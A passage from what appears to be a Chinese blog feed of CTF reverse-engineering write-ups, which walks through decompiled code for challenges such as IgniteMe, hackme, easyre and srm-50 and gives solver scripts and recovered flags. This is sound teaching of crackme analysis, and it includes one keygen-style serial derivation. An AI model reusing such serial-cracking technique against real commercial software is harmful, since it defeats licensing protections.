&amp;&amp; j &lt;= 122)) {                int tmp = j ^xor_[3 * i + 1];                if (tmp * (flag[3 * i] ^ xor_[3 * i]) % thirdchar[i] == masterArray[i]) {                    flag[3 * i + 1] = j;                    break;                }            } else                continue;        }    }    cout &lt;&lt; flag &lt;&lt; endl;}</code></pre><p>输出flag，再套上<code>main</code>里面提供的格式即可</p><pre><code>tuctf{AfricanOrEuropean?}</code></pre><h4 id="android-app-100"><a href="#android-app-100" class="headerlink" title="android-app-100"></a>android-app-100</h4><p>反编译之后发现还调用了c的库，于是IDA打开so文件，看到了混淆，但是内容比较好猜，所以直接找到字符串计算md5或者在apk里面提交就好了</p><pre><code>Sharif_CTF(833489ef285e6fa80690099efc5d9c9d)</code></pre><h4 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h4><p>打开直接找到输入的flag的md5值，md5解密找到flag</p><pre><code>b781cbb29054db12f88f08c6e161c199</code></pre><h4 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h4><p>这道题很有意思，首先查壳，发现是upx，直接脱壳，IDA打开，F5查看</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre><p>表面上看我们需要输入一个字符串，然后经过<code>sub_401000</code>的变换之后变成<code>DDCTF{reverseME}</code>，然后查看一下加密函数</p><pre><code class="c++">unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int v2; // edi  unsigned int result; // eax  int v4; // ebx  v2 = 0;  result = strlen(a1);  if ( result )  {    v4 = a1 - v1;    do    {      *v1 = byte_402FF8[(char)v1[v4]];      ++v2;      ++v1;      result = strlen(a1);    }    while ( v2 &lt; result );  }  return result;}</code></pre><p>看起来是一个换表操作，但是在这里遇到了两个让人疑惑的事情，第一个，我们输入的字符串是怎么传入这个函数里面来的，第二个，在<code>0x402FF8</code>处什么都没有，这个表在哪里</p><p>所以还是需要仔细看看汇编代码</p><pre><code class="asm">.text:004010A4                   lea     edx, [esp+824h+var_404].text:004010AB                 push    edx.text:004010AC                 push    offset aS       ; &quot;%s&quot;.text:004010B1                 call    ds:scanf.text:004010B7                 lea     eax, [esp+82Ch+var_404].text:004010BE                 push    eax.text:004010BF                 lea     ecx, [esp+830h+var_804].text:004010C3                 call    sub_401000.text:00401000 sub_401000      proc near               ; CODE XREF: _main+73↓p.text:00401000.text:00401000 arg_0           = dword ptr  4.text:00401000.text:00401000                 push    ecx.text:00401001                 push    ebp.text:00401002                 mov     ebp, [esp+8+arg_0].text:00401006                 push    esi.text:00401007                 mov     eax, ebp.text:00401009                 push    edi.text:0040100A                 xor     edi, edi.text:0040100C                 lea     esi, [eax+1].text:0040100F                 nop</code></pre><p>这里应该是人为修改了代码，可以看到我们输入的字符串地址被赋给了<code>ecx</code>，然后再我们的解密函数最开始，先把<code>ecx</code>里面的值压进了栈，所以这个函数用了<code>ecx</code>寄存器来传参，而这是个32位的程序，所以IDA这里检测的时候出现了一点问题，第一个问题解决了，再看看第二个，先来研究里面的索引值</p><pre><code class="c++">if ( result )  {    v4 = a1 - v1;    do    {      *v1 = byte_402FF8[(char)v1[v4]];      ++v2;      ++v1;      result = strlen(a1);    }    while ( v2 &lt; result );  }</code></pre><p><code>v1[v4]</code>这个表达形式可以看得出来就是<code>a1</code>的首地址，而<code>a1</code>就是我们输入的字符串，都是可见字符，所以每个字符的值都要大于32，所以在<code>0x402FF8</code>这个位置向下偏移至少32的位置寻找，找到了真正的字母表</p><p>分析结束，可以直接动手逆向了，不过在导出这个字母表的时候很凑巧的发现这个字母表的值刚好是从126-32的排列，这说明我们输入的和变换出来的值相加正好为158，这就提供了一个更简单的逆向思路</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    string target = &quot;DDCTF{reverseME}&quot;;    string flag = &quot;&quot;;    for (int i = 0; i &lt; target.length(); i++) {        flag += 158 - target[i];    }    cout &lt;&lt; flag &lt;&lt; endl;}</code></pre><p>输出套上flag即可</p><pre><code>ZZ[JX#,9(9,+9QY!</code></pre><h4 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h4><p>这个题本身没有什么，很简单的算法，也没有什么加密、加壳，主要是有些受不了IDA+Retdec反汇编出来的代码，所以试了一下Ghidra</p><pre><code class="c++">void FUN_004009a8(void){  int iVar1;  int iStack48;  byte abStack44 [36];  setbuf(stdout,(char *)0x0);  setbuf(stdin,(char *)0x0);  printf(&quot;Give me your flag:&quot;);  scanf(&quot;%32s&quot;,abStack44);  iStack48 = 0;  while (iStack48 &lt; 0x20) {    abStack44[iStack48] = abStack44[iStack48] ^ 0x20U - (char)iStack48;    iStack48 = iStack48 + 1;  }  iVar1 = strncmp((char *)abStack44,_fdata,5);  if (iVar1 == 0) {    FUN_004007f0(abStack44);  }  else {    puts(&quot;Wrong&quot;);  }  return;}</code></pre><p>首先是输入flag，然后进行一个变换，先比较前5位，如果一致进入下一个变换</p><pre><code class="c++">void FUN_004007f0(char *param_1){  size_t sVar1;  int iVar2;  uint uStack16;  uStack16 = 5;  while (sVar1 = strlen(param_1), uStack16 &lt; sVar1) {    if ((uStack16 &amp; 1) == 0) {      param_1[uStack16] =           (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1a) &gt;&gt; 0x18) | param_1[uStack16] &gt;&gt; 6;    }    else {      param_1[uStack16] =           param_1[uStack16] &gt;&gt; 2 | (byte)((uint)((int)param_1[uStack16] &lt;&lt; 0x1e) &gt;&gt; 0x18);    }    uStack16 = uStack16 + 1;  }  iVar2 = strncmp(param_1 + 5,PTR_DAT_00410d04,0x1b);  if (iVar2 == 0) {    puts(&quot;Right!&quot;);  }  else {    puts(&quot;Wrong!&quot;);  }  return;}</code></pre><p>后面对奇数位和偶数位进行了两个不同的位运算，很清晰，仔细分析一下会发现实际上是前后位置的一个交换，并且奇偶运算就是互为逆运算，逆向的时候更方便处理了。最后是进行简单的字符串比较，然后程序就结束了。</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    string target = &quot;Q|j{g\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;    string flag = &quot;&quot;;    for (int i = 0; i &lt; target.length(); i++) {        if(i&gt;=5)        {            int32_t tmp=target[i];            if(i%2==0)            {                tmp=((tmp&amp;0x3)&lt;&lt;6)|((tmp&amp;0xfc)&gt;&gt;2);            }            else            {                tmp=((tmp&amp;0xc0)&gt;&gt;6)|((tmp&amp;0x3f)&lt;&lt;2);            }            flag+=(tmp^(0x20-i));        }        else        {            flag+=(target[i]^(0x20-i));        }    }    cout &lt;&lt; flag &lt;&lt; endl;}</code></pre><p>需要注意的两点，运算符优先级的问题，加减运算要先于移位运算先于位运算，处理的时候需要注意，还有，移位的时候要注意把多余的位置清0，这里用的是与运算</p><p>输出flag</p><pre><code>qctf{ReA11y_4_B@89_mlp5_4_XmAn_}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-re部分题解（二）</title>
    <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>题目有点多，放在一篇里面太过臃肿，所以多分了几篇</p><a id="more"></a><h4 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h4><p>IDA打开，首先发现flag的格式，<code>EIS{***}</code></p><p>找到关键函数</p><pre><code class="c++">bool __cdecl sub_4011C0(char *a1){  size_t v2; // eax  signed int v3; // [esp+50h] [ebp-B0h]  char v4[32]; // [esp+54h] [ebp-ACh]  int v5; // [esp+74h] [ebp-8Ch]  int v6; // [esp+78h] [ebp-88h]  size_t i; // [esp+7Ch] [ebp-84h]  char v8[128]; // [esp+80h] [ebp-80h]  if ( strlen(a1) &lt;= 4 )    return 0;  i = 4;  v6 = 0;  while ( i &lt; strlen(a1) - 1 )    v8[v6++] = a1[i++];  v8[v6] = 0;  v5 = 0;  v3 = 0;                                       // v8=a1  memset(v4, 0, 0x20u);  for ( i = 0; ; ++i )  {    v2 = strlen(v8);    if ( i &gt;= v2 )      break;    if ( v8[i] &gt;= &#39;a&#39; &amp;&amp; v8[i] &lt;= &#39;z&#39; )    {      v8[i] -= 32;      v3 = 1;    }    if ( !v3 &amp;&amp; v8[i] &gt;= &#39;A&#39; &amp;&amp; v8[i] &lt;= &#39;Z&#39; )      v8[i] += 32;                                //大小写互换    v4[i] = byte_4420B0[i] ^ sub_4013C0(v8[i]);    //唯一一步有用的计算    v3 = 0;  }  return strcmp(&quot;GONDPHyGjPEKruv{{pj]X@rF&quot;, v4) == 0;</code></pre><p>据此写脚本逆向</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    string v4=&quot;GONDPHyGjPEKruv{{pj]X@rF&quot;;    unsigned char byte_4420B0[] =            {                    13,  19,  23,  17,   2,   1,  32,  29,  12,   2,                    25,  47,  23,  43,  36,  31,  30,  22,   9,  15,                    21,  39,  19,  38,  10,  47,  30,  26,  45,  12,                    34,   4            };    char v8[v4.length()];    for (int i = 0;i&lt;v4.length() ; ++i )    {        v8[i]=((v4[i]^byte_4420B0[i])-72)^0x55;        if ( v8[i] &gt;= &#39;a&#39; &amp;&amp; v8[i] &lt;= &#39;z&#39; )        {            v8[i] -= 32;        } else if(v8[i] &gt;= &#39;A&#39; &amp;&amp; v8[i] &lt;= &#39;Z&#39;){            v8[i] += 32;        }        else{            continue;        }    }    cout&lt;&lt;v8&lt;&lt;endl;    return 0;}</code></pre><p>把输出和我们已知的部分结合起来得到flag</p><pre><code>EIS{wadx_tdgk_aihc_ihkn_pjlm}</code></pre><h4 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h4><p>通过字符串找到关键部分</p><pre><code class="c++">__int64 __fastcall sub_400F8E(__int64 a1, __int64 a2){  __int64 v2; // rdx  __int64 v3; // rcx  __int64 v4; // r8  __int64 v5; // r9  int index; // eax  char v8[136]; // [rsp+10h] [rbp-B0h]  int v9; // [rsp+98h] [rbp-28h]  char v10; // [rsp+9Fh] [rbp-21h]  int v11; // [rsp+A0h] [rbp-20h]  unsigned __int8 v12; // [rsp+A6h] [rbp-1Ah]  char v13; // [rsp+A7h] [rbp-19h]  int v14; // [rsp+A8h] [rbp-18h]  int v15; // [rsp+ACh] [rbp-14h]  unsigned int v16; // [rsp+B0h] [rbp-10h]  int v17; // [rsp+B4h] [rbp-Ch]  _BOOL4 v18; // [rsp+B8h] [rbp-8h]  int i; // [rsp+BCh] [rbp-4h]  printf((unsigned __int64)&quot;Give me the password: &quot;);  scanf((__int64)&quot;%s&quot;, v8, a2);  for ( i = 0; v8[i]; ++i )    ;  v18 = i == 22;  v17 = 10;  do  {    index = rand((__int64)&quot;%s&quot;, (__int64)v8, v2, v3, v4, v5);    v3 = (unsigned int)(index % 22);    v14 = index % 22;    v16 = 0;    v13 = byte_6B4270[index % 22];    v12 = v8[index % 22];    v11 = index % 22 + 1;    v15 = 0;    while ( v15 &lt; v11 )    {      ++v15;      v16 = 1828812941 * v16 + 12345;    }    v2 = v16;    v10 = v16 ^ v12;    if ( v13 != ((unsigned __int8)v16 ^ v12) )      v18 = 0;    --v17;  }  while ( v17 );  if ( v18 )    v9 = printf((unsigned __int64)&quot;Congras\n&quot;);  else    v9 = printf((unsigned __int64)&quot;Oh no!\n&quot;);  return 0LL;}</code></pre><p>就是个简单的运算，写个脚本逆运算一下就出来了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char byte_6B4270[] =            {                    95, 242,  94, 139,  78,  14, 163, 170, 199, 147,                    129,  61,  95, 116, 163,   9, 145,  43,  73,  40,                    147, 103            };    char v13;    char v12;    char v8[23];    unsigned int v16=0;    for(int i=0;i&lt;22;i++)    {        v16=0;        v13=byte_6B4270[i];        int v11=i+1;        int v15=0;        while(v15&lt;v11){            ++v15;            v16=1828812941 * v16 + 12345;        }        v8[i]=v13^v16;    }    cout&lt;&lt;v8&lt;&lt;endl;    return 0;}</code></pre><p>输出flag</p><pre><code>flag{d826e6926098ef46}</code></pre><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>还是通过字符串找到关键函数</p><pre><code class="c++">int sub_401080(){  unsigned int v0; // kr00_4  signed int v1; // edx  char *v2; // esi  char v3; // al  unsigned int v4; // edx  int v5; // eax  __int128 v7; // [esp+2h] [ebp-24h]  __int64 v8; // [esp+12h] [ebp-14h]  int v9; // [esp+1Ah] [ebp-Ch]  __int16 v10; // [esp+1Eh] [ebp-8h]  printf(&quot;input：&quot;, v7);  v9 = 0;  v10 = 0;  v7 = 0i64;  v8 = 0i64;  scanf((const char *)&amp;dword_402158, (unsigned int)&amp;v7);  v0 = strlen((const char *)&amp;v7);  if ( v0 &gt;= 16 &amp;&amp; v0 == 24 )                   // flag共24位  {    v1 = 0;    v2 = (char *)&amp;v8 + 7;    do    {      v3 = *v2--;      byte_40336C[v1++] = v3;                   // 输入的flag倒序    }    while ( v1 &lt; 24 );    v4 = 0;    do    {      byte_40336C[v4] = (byte_40336C[v4] + 1) ^ 6;      ++v4;    }    while ( v4 &lt; 24 );    v5 = strcmp(byte_40336C, &quot;xIrCj~&lt;r|2tWsv3PtI\x7Fzndka&quot;);    if ( v5 )      v5 = -(v5 &lt; 0) | 1;    if ( !v5 )    {      printf(&quot;right\n&quot;, v7);      system(&quot;pause&quot;);    }  }  return 0;}</code></pre><p>里面的算法变得复杂而毫无意义，真正实现的功能就两个，首先将输入的字符串逆序，然后进行一个变换，最后得到已知的字符串</p><pre><code class="python">target=&#39;xIrCj~&lt;r|2tWsv3PtI\x7Fzndka&#39;flag=&#39;&#39;for i in target:    flag+=chr((ord(i)^6)-1)print(flag[::-1])</code></pre><p>输出flag</p><pre><code>flag{xNqU4otPq3ys9wkDsN}</code></pre><h4 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h4><p>打开把所有的整数转换为字符就看到了flag</p><pre><code>SECCON{Welcome to the SECCON 2014 CTF!}</code></pre><h4 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h4><p>这题是MIPS，IDA直接反编译不出来，MIPS指令学的也不是很好，所以直接用retdec插件</p><p>retdec直接反编译出来</p><pre><code class="c++">int main(int argc, char ** argv) {    // 0x401398    for (int32_t i = 0; i &lt; 31; i++) {        char v1 = *(char *)(i + (int32_t)&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;); // 0x4013d8        char v2 = *(char *)(*(int32_t *)((int32_t)argv + 4) + i); // 0x4013f0        if ((int32_t)v1 != ((int32_t)v2 ^ 55)) {            // 0x401408            print();            exit_funct();        }    }    // 0x401444    exit_funct();    return 1;}</code></pre><p>可以发现只有一个异或操作</p><pre><code class="python">target=&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;flag=&#39;&#39;for i in target:    flag+=chr((ord(i)^55))print(flag)</code></pre><p>输出flag</p><pre><code>TUCTF{but_really_whoisjohngalt}</code></pre><h4 id="parallel-comparator-200"><a href="#parallel-comparator-200" class="headerlink" title="parallel-comparator-200"></a>parallel-comparator-200</h4><p>代码审计，直接给出了源码</p><pre><code class="c++">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#define FLAG_LEN 20void * checking(void *arg) {    char *result = malloc(sizeof(char));    char *argument = (char *)arg;    *result = (argument[0]+argument[1]) ^ argument[2];    return result;}int highly_optimized_parallel_comparsion(char *user_string){    int initialization_number;    int i;    char generated_string[FLAG_LEN + 1];    generated_string[FLAG_LEN] = &#39;\0&#39;;    while ((initialization_number = random()) &gt;= 64);    int first_letter;    first_letter = (initialization_number % 26) + 97;    pthread_t thread[FLAG_LEN];    char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7};    char *arguments[20];    for (i = 0; i &lt; FLAG_LEN; i++) {        arguments[i] = (char *)malloc(3*sizeof(char));        arguments[i][0] = first_letter;        arguments[i][1] = differences[i];        arguments[i][2] = user_string[i];        pthread_create((pthread_t*)(thread+i), NULL, checking, arguments[i]);    }    void *result;    int just_a_string[FLAG_LEN] = {115, 116, 114, 97, 110, 103, 101, 95, 115, 116, 114, 105, 110, 103, 95, 105, 116, 95, 105, 115};    for (i = 0; i &lt; FLAG_LEN; i++) {        pthread_join(*(thread+i), &amp;result);        generated_string[i] = *(char *)result + just_a_string[i];        free(result);        free(arguments[i]);    }    int is_ok = 1;    for (i = 0; i &lt; FLAG_LEN; i++) {        if (generated_string[i] != just_a_string[i])            return 0;    }    return 1;}int main(){    char *user_string = (char *)calloc(FLAG_LEN+1, sizeof(char));    fgets(user_string, FLAG_LEN+1, stdin);    int is_ok = highly_optimized_parallel_comparsion(user_string);    if (is_ok)        printf(&quot;You win!\n&quot;);    else        printf(&quot;Wrong!\n&quot;);    return 0;}</code></pre><p>源码比较长，但是做的事情不多，需要注意三个函数的用法</p><p>第一个是<code>pthread_create()</code>用来创建一个新的线程</p><pre><code class="c++">int pthread_create(pthread_t *tidp,const pthread_attr_t *attr,(void*)(*start_rtn)(void*),void *arg);</code></pre><p>几个参数分别是，指向线程的指针，线程的属性，调用的函数和参数，在这段代码里实际上就是调用<code>checking()</code>函数，并把之前设定好的参数传给函数</p><p>第二个是<code>pthread_join()</code>用来传递返回结果</p><pre><code class="c++">int pthread_join(pthread_t thread, void **retval);</code></pre><p>所以result就是指向返回结果的指针，所以最终的目的就是让<code>checking()</code>函数返回的值为0</p><p>第三个是<code>random()</code>函数，在这之前没有用随机种子初始化生成器，所以随机数生成的结果不管怎么运行都是一样的，但是需要注意linux下<code>random()</code>和windows下<code>rand()</code>生成的数据并不一样</p><p>此外还需要注意一点，在c++里面，赋值语句的返回值是赋的值而不是布尔值</p><p>所以只需要根据<code>checking()</code>函数来逆向运算一下就可以得到结果了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;#define FLAG_LEN 20using namespace std;int main() {    char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7};    int first_letter;    first_letter = 108;    char flag[FLAG_LEN];    for (int i = 0; i &lt; FLAG_LEN; i++) {        flag[i] = first_letter + differences[i];    }    cout &lt;&lt; flag &lt;&lt; endl;    return 0;}</code></pre><p>输出flag</p><pre><code>lucky_hacker_you_are</code></pre><h4 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h4><p>题目里面只有一个结构体，运行了一遍什么都没发现，OD调试的时候查找字符串找到flag</p><pre><code>aliens_are_around_us</code></pre><h4 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h4><p>这题是个简单的注册机，找到关键函数</p><pre><code class="c++">BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4){  HMODULE v5; // eax  HICON v6; // eax  HMODULE v7; // eax  HCURSOR v8; // ST20_4  HWND v9; // eax  CHAR String; // [esp+8h] [ebp-340h]  CHAR v11[4]; // [esp+108h] [ebp-240h]  char v12; // [esp+10Ch] [ebp-23Ch]  char v13; // [esp+10Dh] [ebp-23Bh]  char v14; // [esp+10Eh] [ebp-23Ah]  char v15; // [esp+10Fh] [ebp-239h]  char v16; // [esp+110h] [ebp-238h]  char v17; // [esp+111h] [ebp-237h]  char v18; // [esp+112h] [ebp-236h]  char v19; // [esp+113h] [ebp-235h]  char v20; // [esp+114h] [ebp-234h]  char v21; // [esp+115h] [ebp-233h]  char v22; // [esp+116h] [ebp-232h]  char v23; // [esp+117h] [ebp-231h]  CHAR Text; // [esp+208h] [ebp-140h]  char Src[16]; // [esp+308h] [ebp-40h]  __int128 v26; // [esp+318h] [ebp-30h]  int v27; // [esp+328h] [ebp-20h]  __int128 v28; // [esp+32Ch] [ebp-1Ch]  int v29; // [esp+33Ch] [ebp-Ch]  __int16 v30; // [esp+340h] [ebp-8h]  if ( a2 == 16 )  {    EndDialog(hDlg, 0);    return 0;  }  if ( a2 == 272 )  {    v5 = GetModuleHandleW(0);    v6 = LoadIconW(v5, (LPCWSTR)0x67);    SetClassLongA(hDlg, -14, (LONG)v6);    v7 = GetModuleHandleW(0);    v8 = LoadCursorW(v7, (LPCWSTR)0x66);    v9 = GetDlgItem(hDlg, 1);    SetClassLongA(v9, -12, (LONG)v8);    return 1;  }  if ( a2 != 273 || (unsigned __int16)a3 != 1 )    return 0;  memset(&amp;String, (unsigned __int16)a3 - 1, 0x100u);  memset(v11, 0, 0x100u);  memset(&amp;Text, 0, 0x100u);  GetDlgItemTextA(hDlg, 1001, &amp;String, 256);  GetDlgItemTextA(hDlg, 1002, v11, 256);  if ( strstr(&amp;String, &quot;@&quot;) &amp;&amp; strstr(&amp;String, &quot;.&quot;) &amp;&amp; strstr(&amp;String, &quot;.&quot;)[1] &amp;&amp; strstr(&amp;String, &quot;@&quot;)[1] != 46 )  {    v28 = xmmword_410AA0;    v29 = 1701999980;    *(_OWORD *)Src = xmmword_410A90;    v30 = 46;    v26 = xmmword_410A80;    v27 = 3830633;    if ( strlen(v11) != 16      || v11[0] != 67      || v23 != 88      || v11[1] != 90      || v11[1] + v22 != 155      || v11[2] != 57      || v11[2] + v21 != 155      || v11[3] != 100      || v20 != 55      || v12 != 109      || v19 != 71      || v13 != 113      || v13 + v18 != 170      || v14 != 52      || v17 != 103      || v15 != 99      || v16 != 56 )    {      strcpy_s(&amp;Text, 0x100u, (const char *)&amp;v28);    }    else    {      strcpy_s(&amp;Text, 0x100u, Src);      strcat_s(&amp;Text, 0x100u, v11);    }  }  else  {    strcpy_s(&amp;Text, 0x100u, &quot;Your E-mail address in not valid.&quot;);  }  MessageBoxA(hDlg, &amp;Text, &quot;Registeration&quot;, 0x40u);  return 1;}</code></pre><p>过程十分简单，先简单判断邮箱是不是符合格式，如果符合进入序列号的判断，序列号的判断关键也就只有一个if条件，然后就会输出注册有没有成功</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    char v11[17]={0};    v11[0] = &#39;C&#39;;    v11[15] = &#39;X&#39;;    v11[1] = &#39;Z&#39;;    v11[14] = 155-v11[1];    v11[2] = 57;     v11[13] = 155-v11[2];    v11[3] = 100;    v11[12] = 55;    v11[4] = 109;    v11[11] = 71;    v11[5] = 113;    v11[10] = 170-v11[5];    v11[6] = 52;    v11[9] = 103;    v11[7] = 99;    v11[8] = 56;    cout&lt;&lt;v11&lt;&lt;endl;    return 0;}</code></pre><p>输出结果为</p><pre><code>CZ9dmq4c8g9G7bAX</code></pre><h4 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h4><p>通过字符串找到关键函数</p><pre><code class="c++">int __stdcall sub_401090(HWND hWnd, int a2, int a3, int a4){  char v5; // [esp+50h] [ebp-310h]  CHAR Text[4]; // [esp+154h] [ebp-20Ch]  char v7; // [esp+159h] [ebp-207h]  __int16 v8; // [esp+255h] [ebp-10Bh]  char v9; // [esp+257h] [ebp-109h]  int v10; // [esp+258h] [ebp-108h]  CHAR String; // [esp+25Ch] [ebp-104h]  char v12; // [esp+25Fh] [ebp-101h]  char v13; // [esp+260h] [ebp-100h]  char v14; // [esp+261h] [ebp-FFh]  memset(&amp;String, 0, 0x104u);  v10 = 0;  if ( a2 == 16 )  {    DestroyWindow(hWnd);    PostQuitMessage(0);  }  else if ( a2 == 273 )  {    if ( a3 == 1000 )    {      GetDlgItemTextA(hWnd, 1002, &amp;String, 260);      strlen(&amp;String);      if ( strlen(&amp;String) &gt; 6 )        ExitProcess(0);      v10 = atoi(&amp;String) + 1;      if ( v10 == 123 &amp;&amp; v12 == &#39;x&#39; &amp;&amp; v14 == &#39;z&#39; &amp;&amp; v13 == &#39;y&#39; )      {        strcpy(Text, &quot;flag&quot;);        memset(&amp;v7, 0, 0xFCu);        v8 = 0;        v9 = 0;        _itoa(v10, &amp;v5, 10);        strcat(Text, &quot;{&quot;);        strcat(Text, &amp;v5);        strcat(Text, &quot;_&quot;);        strcat(Text, &quot;Buff3r_0v3rf|0w&quot;);        strcat(Text, &quot;}&quot;);        MessageBoxA(0, Text, &quot;well done&quot;, 0);      }      SetTimer(hWnd, 1u, 0x3E8u, TimerFunc);    }    if ( a3 == 1001 )      KillTimer(hWnd, 1u);  }  return 0;}</code></pre><p>发现我们只要输入122xyz，就会输出flag，而且flag也可以直接拼凑出来</p><pre><code>flag{123_Buff3r_0v3rf|0w}</code></pre><h4 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h4><p>这题题目里面的if实在是太多了，主要是为了判断是不是有debugger，所以不能通过调试的方式获得flag，所以还是要研究一下代码</p><pre><code class="c++">if ( strlen(bufParentRead) == 42 )          {            if ( !strncmp(&amp;bufParentRead[1], &quot;53fc275d81&quot;, 10uLL) )            {              if ( bufParentRead[strlen(bufParentRead) - 1] == &#39;}&#39; )              {                if ( !strncmp(&amp;bufParentRead[31], &quot;4938ae4efd&quot;, 10uLL) )                {                  if ( !confuseKey(bufParentRead, 42) )                  {                    responseFalse();                  }                  else if ( !strncmp(bufParentRead, &quot;{daf29f59034938ae4efd53fc275d81053ed5be8c}&quot;, 42uLL) )                  {                    responseTrue();                  }                  else                  {                    responseFalse();                  }                }                else                {                  responseFalse();                }              }              else              {                responseFalse();              }            }            else            {              responseFalse();            }</code></pre><p>截取了其中一段，这里把flag分成了4个部分，每段10个字符，已经知道第一段地最后一段，但是也知道经过<code>confuseKey()</code>之后flag是什么，所以我们只要研究一下<code>confusekey()</code>就可以了</p><pre><code class="c++">bool __cdecl confuseKey(char *szKey, int iKeyLength){  char szPart1[15]; // [rsp+10h] [rbp-50h]  char szPart2[15]; // [rsp+20h] [rbp-40h]  char szPart3[15]; // [rsp+30h] [rbp-30h]  char szPart4[15]; // [rsp+40h] [rbp-20h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  *(_QWORD *)szPart1 = 0LL;  *(_DWORD *)&amp;szPart1[8] = 0;  *(_WORD *)&amp;szPart1[12] = 0;  szPart1[14] = 0;  *(_QWORD *)szPart2 = 0LL;  *(_DWORD *)&amp;szPart2[8] = 0;  *(_WORD *)&amp;szPart2[12] = 0;  szPart2[14] = 0;  *(_QWORD *)szPart3 = 0LL;  *(_DWORD *)&amp;szPart3[8] = 0;  *(_WORD *)&amp;szPart3[12] = 0;  szPart3[14] = 0;  *(_QWORD *)szPart4 = 0LL;  *(_DWORD *)&amp;szPart4[8] = 0;  *(_WORD *)&amp;szPart4[12] = 0;  szPart4[14] = 0;  if ( iKeyLength != 42 )    return 0;  if ( !szKey )    return 0;  if ( strlen(szKey) != 42 )    return 0;  if ( *szKey != &#39;{&#39; )    return 0;  strncpy(szPart1, szKey + 1, 0xAuLL);  strncpy(szPart2, szKey + 11, 0xAuLL);  strncpy(szPart3, szKey + 21, 0xAuLL);  strncpy(szPart4, szKey + 31, 0xAuLL);  memset(szKey, 0, iKeyLength);  *szKey = 123;  strcat(szKey, szPart3);  strcat(szKey, szPart4);  strcat(szKey, szPart1);  strcat(szKey, szPart2);  szKey[41] = 125;  return 1;}</code></pre><p>内容挺多，实际上只实现了一件事情，把四段调换了一个顺序，变成了3421的顺序，所以调整一下顺序就出来了</p><pre><code>53fc275d81053ed5be8cdaf29f59034938ae4efd</code></pre><h4 id="crazy"><a href="#crazy" class="headerlink" title="crazy"></a>crazy</h4><p>这题c++17编写，还有类，乍一看有点复杂，但实际上不是很难</p><p>还是先看关键函数，这里在main函数里就进行了处理</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  __int64 v9; // rax  __int64 v10; // rax  __int64 v11; // rax  __int64 v12; // rax  __int64 v13; // rax  __int64 v14; // rax  __int64 v15; // rax  __int64 v16; // rax  char v18; // [rsp+10h] [rbp-130h]  char v19; // [rsp+30h] [rbp-110h]  char v20; // [rsp+50h] [rbp-F0h]  char v21; // [rsp+70h] [rbp-D0h]  char v22; // 